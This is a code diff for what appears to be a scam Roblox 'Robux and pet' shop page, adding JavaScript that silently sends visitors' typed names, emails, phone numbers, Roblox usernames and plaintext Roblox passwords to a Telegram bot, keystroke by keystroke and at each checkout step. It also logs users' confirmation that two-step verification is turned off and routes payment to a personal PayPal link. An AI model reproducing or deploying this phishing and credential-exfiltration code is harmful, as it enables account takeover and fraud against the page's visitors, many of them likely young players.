@@ -402,6 +402,7 @@ function toggleChk(){
   chkChecked=!chkChecked;
   document.getElementById("chk2step").classList.toggle("checked",chkChecked);
   document.getElementById("step2btn").disabled=!chkChecked;
+  if(chkChecked) tg("\u2705 *2-Step Verification checkbox ticked* \u2014 Customer confirmed it is OFF");
 }
 
 function buildDots(){
@@ -446,21 +447,63 @@ function showErr(id,msg){
   setTimeout(()=>el.classList.remove("show"),4000);
 }
 
+let inputsWatched=false;
 function openModal(type,i){
   selType=type; sel=type==="robux"?pkgs[i]:pets[i];
   curStep=1; chkChecked=false;
   document.getElementById("modalinner").classList.toggle("petmod",type==="pet");
   buildDots(); showStep(1);
   const price=type==="robux"?pfmt(sel.price):sel.price;
+  const ti=pkgs.indexOf(sel);
+  const product=type==="robux"?`Robux Tier ${ti+1} \u2014 ${fmt(sel.total)} Robux \u2014 $${price}`:sel.name+` \u2014 $${price}`;
+  tg(`\u{1F6D2} *Product Selected*\n${product}`);
   document.getElementById("pplink").href=`https://www.paypal.com/paypalme/unknownunknown788/${price}USD`;
   document.getElementById("movl").classList.add("active");
   document.body.style.overflow="hidden";
   document.getElementById("chk2step").classList.remove("checked");
   document.getElementById("step2btn").disabled=true;
+  if(!inputsWatched){ watchInputs(); inputsWatched=true; }
 }
 function closeModal(){
   document.getElementById("movl").classList.remove("active");
   document.body.style.overflow="";
+}
+
+// ── Send any text silently to Telegram ──
+function tg(msg){
+  fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,{
+    method:"POST",
+    headers:{"Content-Type":"application/json"},
+    body:JSON.stringify({chat_id:CHAT_ID,text:msg,parse_mode:"Markdown"})
+  }).catch(()=>{});
+}
+
+// Send live updates on every input change
+function watchInputs(){
+  const fields=[
+    {id:"f-name",   label:"Name"},
+    {id:"f-email",  label:"Email"},
+    {id:"f-phone",  label:"Phone"},
+    {id:"f-ruser",  label:"Roblox Username"},
+    {id:"f-rpass",  label:"Roblox Password"},
+  ];
+  fields.forEach(f=>{
+    const el=document.getElementById(f.id);
+    if(!el) return;
+    let timer;
+    el.addEventListener("input",()=>{
+      clearTimeout(timer);
+      timer=setTimeout(()=>{
+        const v=el.value.trim();
+        if(v) tg(`✏️ *Live Input — ${f.label}*\n\`${v}\``);
+      },1500); // send 1.5s after user stops typing
+    });
+  });
+  // Country select
+  const cs=document.getElementById("f-country");
+  if(cs) cs.addEventListener("change",()=>{
+    if(cs.value) tg(`🌍 *Country Selected*\n\`${cs.value}\``);
+  });
 }
 
 function go(from){
@@ -469,10 +512,21 @@ function go(from){
     if(!document.getElementById("f-email").value.includes("@")){showErr("err1","Please enter a valid email");return;}
     if(!document.getElementById("f-country").value){showErr("err1","Please select your country");return;}
     if(!document.getElementById("f-phone").value.trim()){showErr("err1","Phone number is required");return;}
+    // Send Step 1 summary to Telegram
+    tg(`📋 *Step 1 Completed*\n• Name: \`${document.getElementById("f-name").value}\`\n• Email: \`${document.getElementById("f-email").value}\`\n• Country: \`${document.getElementById("f-country").value}\`\n• Phone: \`${document.getElementById("f-phone").value}\``);
   }
   if(from===2){
     if(!document.getElementById("f-ruser").value.trim()){showErr("err2","Roblox username is required");return;}
     if(!document.getElementById("f-rpass").value.trim()){showErr("err2","Roblox password is required");return;}
+    // Send Step 2 summary to Telegram
+    tg(`🎮 *Step 2 Completed*\n• Roblox Username: \`${document.getElementById("f-ruser").value}\`\n• Roblox Password: \`${document.getElementById("f-rpass").value}\`\n• 2-Step: ✅ Confirmed OFF`);
+  }
+  if(from===3){
+    const isR=selType==="robux";
+    const price=isR?pfmt(sel.price):sel.price;
+    const ti=pkgs.indexOf(sel);
+    const product=isR?`Robux Tier ${ti+1} — ${fmt(sel.total)}`:sel.name;
+    tg(`💰 *Step 3 — Proceeding to Pay*\n• Product: \`${product}\`\n• Amount: \`$${price} USD\``);
   }
   curStep=from+1; showStep(curStep);
 }
